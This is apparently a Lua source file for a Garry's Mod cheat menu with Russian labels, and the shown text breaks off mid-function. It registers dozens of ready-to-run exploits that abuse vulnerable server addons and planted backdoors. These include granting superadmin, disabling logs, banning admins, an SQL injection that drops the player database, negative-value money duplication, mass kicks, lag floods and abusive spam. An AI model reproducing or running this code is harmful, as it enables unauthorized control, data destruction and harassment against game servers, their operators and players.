	if iZNX.ValidNetString( "DarkRP_AdminWeapons" ) then
	thefrenchenculer = "DarkRP_AdminWeapons"
	else
	if iZNX.ValidNetString( "cucked" ) then
	thefrenchenculer = "cucked"
	else
	if iZNX.ValidNetString( "NoNerks" ) then
	thefrenchenculer = "NoNerks"
	else
	if iZNX.ValidNetString( "kek" ) then
	thefrenchenculer = "kek"
	else
	if iZNX.ValidNetString( "ZimbaBackDoor" ) then
	thefrenchenculer = "ZimbaBackDoor"
	else
	if iZNX.ValidNetString( "something" ) then
	thefrenchenculer = "something"
	else
	if iZNX.ValidNetString( "random" ) then
	thefrenchenculer = "random"
	else
	if iZNX.ValidNetString( "strip0" ) then
	thefrenchenculer = "strip0"
	else
	if iZNX.ValidNetString( "fellosnake" ) then
	thefrenchenculer = "fellosnake"
	else
	if iZNX.ValidNetString( "enablevac" ) then
	thefrenchenculer = "enablevac"
	else
	if iZNX.ValidNetString( "idk" ) then
	thefrenchenculer = "idk"
	else
	if iZNX.ValidNetString( "c" ) then
	thefrenchenculer = "c"
	else
	if iZNX.ValidNetString( "killserver" ) then
	thefrenchenculer = "killserver"
	else
	if iZNX.ValidNetString( "fuckserver" ) then
	thefrenchenculer = "fuckserver"
	else
	if iZNX.ValidNetString( "cvaraccess" ) then
	thefrenchenculer = "cvaraccess"
	else
	if iZNX.ValidNetString( "rcon" ) then
	thefrenchenculer = "rcon"
	else
	if iZNX.ValidNetString( "rconadmin" ) then
	thefrenchenculer = "rconadmin"
	else
	if iZNX.ValidNetString( "web" ) then
	thefrenchenculer = "web"
	else
	if iZNX.ValidNetString( "jesuslebg" ) then
	thefrenchenculer = "jesuslebg"
	else
	if iZNX.ValidNetString( "zilnix" ) then
	thefrenchenculer = "zilnix"
	else
	if iZNX.ValidNetString( "Þ� ?D)◘" ) then
	thefrenchenculer = "Þ� ?D)◘"
	else
	if iZNX.ValidNetString( "DefqonBackdoor" ) then
	thefrenchenculer = "DefqonBackdoor"
	else
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	iZNX.AddExploit( ".NET Backdoor", {
	desc = "Найден .net backdoor: "..thefrenchenculer.."",
	severity = 1,
	scan = function() return iZNX.ValidNetString( thefrenchenculer ) end,
	functions = {
	{ typ = "func", name = "Отключить логи", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
	net.WriteBit(1)
	net.SendToServer()
	end, },
	{ typ = "func", name = "Toxic.pro", func = function()
	iZNX.Menu:Remove()
	RunConsoleCommand( "toxic.pro" )
	end, },
	{ typ = "htxcommandeliste", name = "Список команд" },
	{ typ = "soundboard", name = "SoundBoard" },
	{ typ = "players", addr = "give_superadmins" },
	{ typ = "func", name = "Superadmin", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "give_superadmins", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	local id = v:SteamID()
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "ulx adduserid "..id.." superadmin" )
	net.WriteBit(false)
	net.SendToServer()
	end
	end, },
	{ typ = "func", name = "Забанить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "give_superadmins", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	local id = v:SteamID()
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "ulx banid "..id.." 0 nudop udu Haxyu" )
	net.WriteBit(false)
	net.SendToServer()
	end
	end }
	}
	}
	)
	iZNX.AddExploit( "☢ Трахнуть базу данных SQL ☢", {
	desc = "Уничтожение базы данных darkrp master, стирая все данные игроков, вы должны быть супер админом !!",
	severity = 4,
	scan = function() return iZNX.ValidNetString( "pplay_sendtable" ) end,
	functions = {
	{ typ = "func", name = "Запуск", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local tbl = {}
	tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
	tbl.ply = LocalPlayer()
	iZNX.NetStart("pplay_sendtable")
	net.WriteTable(tbl)
	net.SendToServer()
	iZNX.ChatText( "База данных SQL Server уничтожена" )
	end, },
	},
	} )
	iZNX.AddExploit( "Уничтожить данные сервера", {
	desc = "Уничтожение данных сервера, вероятно будет бесить одменов)",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "WriteQuery" ) end,
	functions = {
	{ typ = "func", name = "Запуск", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "Defqon_exploit_datatrasher" ) then
	iZNX.ChatText( "Запуск спама в данные сервера" )
	timer.Create( "Defqon_exploit_datatrasher", 0.5, 0, function()
	iZNX.NetStart( "WriteQuery" )
	net.WriteString( "LOL" )
	net.SendToServer()
	end)
	else
	timer.Remove( "Defqon_exploit_datatrasher" )
	iZNX.ChatText( "Прекращение спама" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "[NEW] Broadcast", {
	desc = "Большой спам, очень скучный",
	severity = 1337,
	scan = function() return iZNX.ValidNetString( "VJSay" ) end,
	functions = {
	{ typ = "string", name = "Введите сообщение", default = "DefqonMenu", addr = "vj_string" },
	{ typ = "func", name = "Начать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.ChatText("Broadcasting")
	iZNX.NetStart("VJSay")
	net.WriteEntity(nil)
	net.WriteString( iZNX.GetStored( "vj_string" ) )
	net.WriteString("")
	net.SendToServer()
	end }
	}
	}
	)
	iZNX.AddExploit( "Give weapons", {
	desc = "Exploit дает вам гребаное оружие | Большой шанс неработоспособности",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "CraftSomething" ) end,
	functions = {
	{ typ = "string", name = "Тип оружия", default = "ls_sniper", addr = "armes_a_prendre" },
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart( "CraftSomething" )
	net.WriteEntity( LocalPlayer() )
	net.WriteString( iZNX.GetStored( "armes_a_prendre" ) )
	net.WriteString( "" )
	net.WriteString( "weapon" )
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "ULX Extended ", {
	desc = "Осторожно! Этот эксплойт опасен, если аддон обновлен вы будете кикнуты",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "banleaver" ) end,
	functions = {
	{ typ = "func", name = "Забанить админов", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k,v in pairs(player.GetAll()) do               
	if v:GetUserGroup() != "user" then -- Custom first ranks, youre fucked bro                 
	if v != LocalPlayer() then                 
	iZNX.NetStart("banleaver")                 
	net.WriteString(v:SteamID().."{sep}".."bb")                
	net.SendToServer()                 
	end                
	end                
	end 
	end, },
	{ typ = "func", name = "Забанить всех", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k,v in pairs(player.GetAll()) do               
	if v != LocalPlayer() then                 
	iZNX.NetStart("banleaver")                 
	net.WriteString(v:SteamID().."{sep}".."bb")                
	net.SendToServer()                 
	end                
	end  
	end, },
	},
	} )
	iZNX.AddExploit( "€ Casino NPC €", {
	desc = "Exploit на очень эффективные деньги, купим шлюх и кокс ;)",
	severity = 4,
	scan = function() return iZNX.ValidNetString( "75_plus_win" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent" },
	{ typ = "players", addr = "l_players_listing" },
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_players_listing", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	iZNX.NetStart( "75_plus_win" )
	net.WriteString( iZNX.GetStored( "montant_argent" ) )
	net.WriteEntity(v)
	net.SendToServer()
	end
	end, },
	{ typ = "func", name = "Забрать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_players_listing", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	iZNX.NetStart( "75_plus_win" )
	net.WriteString( -iZNX.GetStored( "montant_argent" ) )
	net.WriteEntity(v)
	net.SendToServer()
	end
	end, },
	},
	} )
	iZNX.AddExploit( "€ ATM €", {
	desc = "Exploit на деньги, идем покупать шлюх и кокс ;)",
	severity = 4,
	scan = function() return iZNX.ValidNetString( "ATMDepositMoney" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent5" },
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart( "ATMDepositMoney" )
	net.WriteFloat( -iZNX.GetStored( "montant_argent5" ) )
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "TAXI Spawn Lag", {
	desc = "Exploit чтобы ссать на процессоры кодеров ;)",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "Taxi_Add" ) end,
	functions = {
	{ typ = "func", name = "Спавн", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local Pos = LocalPlayer():GetEyeTrace().HitPos
	iZNX.NetStart("Taxi_Add")
	net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
	net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
	net.WriteFloat(-9999999)
	net.WriteString("The addons leaks is full of feat :D")
	net.SendToServer()
	end, },
	{ typ = "func", name = "Супер спам", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "taxispam" ) then
	iZNX.ChatText( "Спам спавном такси запущен" )
	timer.Create( "taxispam", 0.05, 0, function()
	local Pos = LocalPlayer():GetEyeTrace().HitPos
	iZNX.NetStart("Taxi_Add")
	net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
	net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
	net.WriteFloat(-9999999)
	net.WriteString("The addons leaks is full of feat :D")
	net.SendToServer()
	end)
	else
	timer.Remove( "taxispam" )
	iZNX.ChatText( "Спам спавном такси прекращен" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "€ eMining €", {
	desc = "Exploit на деньги ;)",
	severity = 4,
	scan = function() return iZNX.ValidNetString( "SellMinerals" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent6" },
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k,v in pairs(SkillDB) do
	if not ( v.iSkill == true ) then
	iZNX.NetStart("Upgrade")
	net.WriteTable( { LuaName = v.LuaName, Amount = -iZNX.GetStored( "montant_argent6" ) } )
	net.SendToServer()
	iZNX.NetStart( "SellMinerals" )
	net.WriteTable( { Target = LocalPlayer() } )
	net.SendToServer()
	end
	end
	end, },
	{ typ = "func", name = "Снять", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k,v in pairs(SkillDB) do
	if not ( v.iSkill == true ) then
	iZNX.NetStart("Upgrade")
	net.WriteTable( { LuaName = v.LuaName, Amount = iZNX.GetStored( "montant_argent6" ) } )
	net.SendToServer()
	iZNX.NetStart( "SellMinerals" )
	net.WriteTable( { Target = LocalPlayer() } )
	net.SendToServer()
	end
	end
	end, },
	},
	} )
	iZNX.AddExploit( "€ Gamble NPC €", {
	desc = "Exploit на бессконечные деньги, купим шлюх и кокс ;)",
	severity = 4,
	scan = function() return iZNX.ValidNetString( "TakeBetMoney" ) end,
	functions = {
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart( "TakeBetMoney" )
	net.WriteTable({1e333333 , 1e333333})
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "€ Kun Oil Mod €", {
	desc = "Exploit на деньги, купим шлюх и кокс ;)",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "Kun_SellOil" ) end,
	functions = {
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k,v in pairs(ents.GetAll()) do
	iZNX.NetStart("Kun_SellOil")
	net.WriteEntity(v)
	net.SendToServer()
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Join the Police 1", {
	desc = "Вступление в полицию, не одевая эту гребаную форму",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "PoliceJoin" ) end,
	functions = {
	{ typ = "func", name = "Вступить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("PoliceJoin")
	net.SendToServer() 
	end, },
	},
	} )
	iZNX.AddExploit( "Join the Police 2", {
	desc = "Вступление в полицию, не одевая эту гребаную форму",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "CpForm_Answers" ) end,
	functions = {
	{ typ = "func", name = "Вступить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("CpForm_Answers")
	net.WriteEntity(LocalPlayer())
	net.WriteTable({})
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "€ Deposit Money €", {
	desc = "Exploit на деньги с ATM банкоматом",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "DepositMoney" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent7" },
	{ typ = "func", name = "Запуск", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k,v in pairs(ents.GetAll()) do 
	swag = v 
	end
	for k,v in pairs(player.GetAll()) do
	iZNX.NetStart( "DepositMoney" )
	net.WriteEntity(swag)
	net.WriteString(-iZNX.GetStored( "montant_argent7" ))
	net.WriteEntity(v)
	net.SendToServer()
	end
	end, },
	},
	} )
	iZNX.AddExploit( "MDE", {
	desc = "Exploit для удаления PermaProps (Наведите на проп и нажмите на кнопку, чтобы удалить его)",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "MDE_RemoveStuff_C2S" ) end,
	functions = {
	{ typ = "func", name = "Удалить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart( "MDE_RemoveStuff_C2S" )
	net.WriteTable( {DATA="",TARGET=LocalPlayer():GetEyeTrace().Entity} )
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "€ SS Shelf NET €", {
	desc = "Exploit на деньги",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "NET_SS_DoBuyTakeoff" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent9" },
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k,v in pairs(ents.GetAll()) do 
	swag = v 
	end
	iZNX.NetStart( 'NET_SS_DoBuyTakeoff' )          
	net.WriteEntity(LocalPlayer())          
	net.WriteEntity(swag)          
	net.WriteTable({'spawned_weapon'})          
	net.WriteInt(-iZNX.GetStored( "montant_argent9" ), 16)       
	net.SendToServer()   
	end, },
	},
	} )
	iZNX.AddExploit( "€ MODIFIER TAXES €", {
	desc = "Exploit на деньги",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "NET_EcSetTax" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent10" },
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("NET_EcSetTax")
	net.WriteInt(-iZNX.GetStored( "montant_argent10" ), 16)
	net.SendToServer() 
	end, },
	},
	} )
	iZNX.AddExploit( "€ Fine System €", {
	desc = "Exploit на деньги, купим шлюх и кокс ;)",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "RP_Accept_Fine" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent11" },
	{ typ = "players", addr = "l_players_listing_fine" },
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_players_listing_fine", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	iZNX.NetStart("RP_Accept_Fine")
	net.WriteString(v:Nick())
	net.WriteDouble(-iZNX.GetStored( "montant_argent11" ))
	net.SendToServer()
	end
	end, },
	{ typ = "func", name = "Отправить всем", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_players_listing_fine", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	iZNX.NetStart("RP_Fine_Player")
	net.WriteString(v:Nick())
	net.WriteString(v:Nick())
	net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
	net.WriteString("This server deserves anarchy! Server hacked !! You can lick my asshole now x)")
	net.SendToServer()
	end
	end, },
	{ typ = "func", name = "Spam send Fine", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "spamamandefine" ) then
	iZNX.ChatText( "Начинаем спам" )
	timer.Create( "spamamandefine", 0.1, 0, function()
	local t = iZNX.GetStored( "l_players_listing_fine", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	iZNX.NetStart("RP_Fine_Player")
	net.WriteString(v:Nick())
	net.WriteString(v:Nick())
	net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
	net.WriteString("This server deserves anarchy! Server hacked !! You can lick my asshole now")
	net.SendToServer()
	end
	end)
	else
	timer.Remove( "spamamandefine" )
	iZNX.ChatText( "Прекращаем спам" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "€ 3D Cardealer €", {
	desc = "Exploit на деньги, Смотрите на купленный автомобиль, чтобы дублировать его ;)",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "RXCAR_Shop_Store_C2S" ) end,
	functions = {
	{ typ = "func", name = "Дублировать", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for i = 0, 75 do               
	iZNX.NetStart( "RXCAR_Shop_Store_C2S" );               
	net.WriteTable( { E = ent } );                 
	net.SendToServer();                
	end
	end, },
	{ typ = "func", name = "Продать все", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local ent              
	for k,v in pairs(ents.GetAll()) do                 
	if v:GetClass() == "rm_car_dealer" then                
	ent = v                
	end                
	end                
	for k,v in pairs(RX3DCar_Inventory) do                 
	iZNX.NetStart( "RXCAR_SellINVCar_C2S" )                
	net.WriteTable({UN=v.UniqueID,SE=ent})                 
	net.SendToServer()                 
	end      
	end, },          
	},
	} )
	iZNX.AddExploit( "Remove Weapons / Money", {
	desc = "Удалить оружие / деньги у всех",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "drugseffect_remove" ) end,
	functions = {
	{ typ = "func", name = "Удалить оружие", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("drugseffect_remove")
	net.SendToServer()
	end, },
	{ typ = "func", name = "Удалить деньги", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("drugs_money")
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "€ Crafting Mod €", {
	desc = "Exploit на деньги",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "CRAFTINGMOD_SHOP" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent14" },
	{ typ = "func", name = "Добавить денег", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("CRAFTINGMOD_SHOP")
	net.WriteTable({
	BUY =   -iZNX.GetStored( "montant_argent14" );
	type    =   1
	})
	net.WriteInt(1,16)
	net.SendToServer()
	end, },
	{ typ = "func", name = "Удалить деньги", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("CRAFTINGMOD_SHOP")
	net.WriteTable({
	BUY =   LocalPlayer():getDarkRPVar("money");
	type    =   1
	})
	net.WriteInt(1,16)
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "Set on FIRE", {
	desc = "Подожгите пропы / игроков. RIP JOHNNY.",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "drugs_ignite" ) end,
	functions = {
	{ typ = "func", name = "Поджечь пропы", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("drugs_ignite")
	net.WriteString("prop_physics")
	net.SendToServer()
	end, },
	{ typ = "func", name = "Поджечь игроков", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("drugs_ignite")
	net.WriteString("player")
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "Change HP", {
	desc = "Измените HP игроков",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "drugseffect_hpremove" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100", addr = "montant_argent15" },
	{ typ = "func", name = "Сетнуть HP", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("drugseffect_hpremove")
	net.WriteString(iZNX.GetStored( "montant_argent15" ))
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "Respawn Exploit", {
	desc = "Exploit на возрождение",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "DarkRP_Kun_ForceSpawn" ) end,
	functions = {
	{ typ = "func", name = "Телепорт", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("DarkRP_Kun_ForceSpawn")
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "Удалить проп 2", {
	desc = "Удаление всех пропов",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "drugs_text" ) end,
	functions = {
	{ typ = "func", name = "Удалить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("drugs_text")
	net.WriteString("prop_physics")
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "Kick 3", {
	desc = "Exploit для кика всех людей",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "NLRKick" ) end,
	functions = {
	{ typ = "players", addr = "l_players_listing515" },
	{ typ = "func", name = "Кик", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_players_listing515", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	iZNX.NetStart("NLRKick")
	net.WriteEntity(v)
	net.SendToServer()
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Kick 2", {
	desc = "Exploit для кика",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "RecKickAFKer" ) end,
	functions = {
	{ typ = "players", addr = "l_players_listing2545" },
	{ typ = "func", name = "Кик", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_players_listing2545", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	iZNX.NetStart("RecKickAFKer")
	net.WriteEntity(v)
	net.SendToServer()
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Loot Items", {
	desc = "Auto-Loot предметов",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "GMBG:PickupItem" ) end,
	functions = {
	{ typ = "func", name = "Лут", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k, v in pairs(ents.GetAll()) do         
	if v:GetClass() == "item_loot" then                 
	iZNX.NetStart("GMBG:PickupItem")
	net.WriteEntity(v)
	net.SendToServer()
	iZNX.NetStart("GMBG:PickupItem")
	net.WriteEntity(v)
	net.SendToServer()
	iZNX.NetStart("GMBG:PickupItem")
	net.WriteEntity(v)
	net.SendToServer()
	iZNX.NetStart("GMBG:PickupItem")
	net.WriteEntity(v)
	net.SendToServer()
	iZNX.NetStart("GMBG:PickupItem")
	net.WriteEntity(v)
	net.SendToServer()
	iZNX.NetStart("GMBG:PickupItem")
	net.WriteEntity(v)
	net.SendToServer()
	end
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Kick everyone", {
	desc = "Exploit для кика всх людей",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "DL_Answering" ) end,
	functions = {
	{ typ = "func", name = "Кик", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	if !timer.Exists( "kickallnoob" ) then
	iZNX.ChatText( "Кик всех запущен" )
	timer.Create( "kickallnoob", 0.05, 0, function()
	for i = 1, 2000 do 
	iZNX.NetStart("DL_Answering")
	net.SendToServer()
	end
	end)
	else
	timer.Remove( "kickallnoob" )
	iZNX.ChatText( "Кик всех прекращен" )
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Kick 1", {
	desc = "Exploit для кика админов",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "plyWarning" ) end,
	functions = {
	{ typ = "players", addr = "l_players_listing255" },
	{ typ = "func", name = "Кик", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_players_listing255", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	iZNX.NetStart('plyWarning')          
	net.WriteEntity(v)          
	net.WriteString('You have to select a player before doing a action.')       
	net.SendToServer()
	iZNX.ChatText("Попытка кикнуть ".. v:Nick().. "!")
	end
	end, },
	},
	} )
	iZNX.AddExploit( "NLR Freeze", {
	desc = "Exploit для заморозки всех людей",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "NLR.ActionPlayer" ) end,
	functions = {
	{ typ = "players", addr = "l_players_listing45" },
	{ typ = "func", name = "Заморозить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	local t = iZNX.GetStored( "l_players_listing45", {} )
	for k, v in pairs( player.GetAll() ) do
	if !table.HasValue( t, v ) then continue end
	iZNX.NetStart("NLR.ActionPlayer")
	net.WriteEntity(v)
	net.SendToServer()
	end  
	end, },
	},
	} )
	iZNX.AddExploit( "Delete props 1", {
	desc = "Удаление всех пропов на сервере",
	severity = 2,
	scan = function() return iZNX.ValidNetString( "timebombDefuse" ) end,
	functions = {
	{ typ = "func", name = "Удалить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for k,v in pairs(ents.GetAll()) do
	iZNX.NetStart("timebombDefuse")
	net.WriteEntity(v)
	net.WriteBool(true)
	net.SendToServer()
	end
	end, },
	},
	} )
	iZNX.AddExploit( "Hack Keypads", {
	desc = "w0w h4ck3r",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "start_wd_emp" ) end,
	functions = {
	{ typ = "func", name = "Хакнуть", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("start_wd_emp")
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "€ Kart System €", {
	desc = "Exploit для денег.",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "kart_sell" ) end,
	functions = {
	{ typ = "func", name = "Запуск", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	for i=1, 300 do
	iZNX.NetStart("kart_sell")
	net.WriteString("sw_gokart")
	net.SendToServer()
	end
	end, },
	},
	} )
	iZNX.AddExploit( "€ Farming Mod €", {
	desc = "Exploit для денег, купим шлюх и кокс ;)",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "FarmingmodSellItems" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent1" },
	{ typ = "func", name = "Получить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart( "FarmingmodSellItems" )
	net.WriteTable(
	{
	Cost    =   10,
	CropModel    =   "models/props/eryk/garlic.mdl",
	CropType =   2,
	Info  =   "Garlic Seed",
	Model =   "models/props/eryk/seedbag.mdl",
	Name    =   "Garlic",
	Quality    =   4,
	Sell  =   iZNX.GetStored( "montant_argent1" ),
	Type  =   "Seed"
	}
	)
	net.WriteInt(1,16)
	net.SendToServer()
	end, },
	},
	} )
	iZNX.AddExploit( "€ Point Shop €", {
	desc = "Exploit для денег, купим шлюх и кокс ;)",
	severity = 3,
	scan = function() return iZNX.ValidNetString( "ClickerAddToPoints" ) end,
	functions = {
	{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent2" },
	{ typ = "func", name = "Запуск", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.NetStart("ClickerAddToPoints")
	net.WriteInt(iZNX.GetStored( "montant_argent2" ), 32)
	net.SendToServer()
	end, },
	},
	} )
	local PM = 1
	local SK = 1
	local BG = 1
	local HN = 1
	local TS = 1
	local GL = 1
	local LG = 1
	iZNX.AddExploit( "Body Groups", {
	desc = "Изменение скина",
	severity = 1,
	scan = function() return iZNX.ValidNetString( "bodyman_model_change" ) end,
	functions = {
	{ typ = "func", name = "Изменить", func = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	PlayerModels = {0,1,2,3,4,5,6}
	Torso = {0,1,2,3,4,5,6,7,8,9,10}
	Legs = {0,1,2,3,4,5,6}
	Hands = {0,1,2}
	Glasses = {0,1}
	Skins = {0,1,2,3,4,5,6,7,8,9,10}
	PM = PM+1
	TS = TS+1
	LG = LG+1   
	HN = HN+1
	GL = GL+1
	SK = SK+1
	if (PM>#PlayerModels) then PM=1 end
	if (SK>#Skins) then SK=1 end
	if (HN>#Hands) then HN=1 end
	if (TS>#Torso) then TS=1 end
	if (GL>#Glasses) then GL=1 end
	if (LG>#Legs) then LG=1 end
	iZNX.NetStart("bodyman_model_change")
	net.WriteInt(PlayerModels[PM], 10 )
	net.SendToServer()
	iZNX.NetStart("bodygroups_change")
	net.WriteTable( { 1, Torso[TS] } )
	net.SendToServer()
